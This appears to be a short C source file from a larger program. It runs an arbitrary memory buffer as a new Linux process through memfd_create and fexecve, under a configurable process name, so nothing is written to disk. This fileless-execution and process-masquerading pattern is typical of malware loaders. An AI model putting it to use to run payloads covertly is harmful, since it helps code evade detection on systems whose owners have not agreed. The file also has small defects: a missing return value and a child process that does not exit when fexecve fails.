#include "exec_handler.h"

#if defined(__linux__)

extern char **environ;

#define __NR_memfd_create 319

static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

#endif

int run_memory(struct buffer *buf) {
#if defined(__linux__)

    int fd;
    char *args[2] = {nix_process_name, NULL};
    char *mem_desc = "888";
    if ((fd = memfd_create(mem_desc, 1)) < 0) {
        return -1;
    }

    write(fd, buf->ptr, buf->size);
    int pid;

    if ((pid = fork()) == -1) {}
    else if (pid == 0) {
        if (fexecve(fd, args, environ))
            return -1;
    }
#endif
    return 0;
}

int exec_handler(struct buffer *buf) {
    run_memory(buf);
}
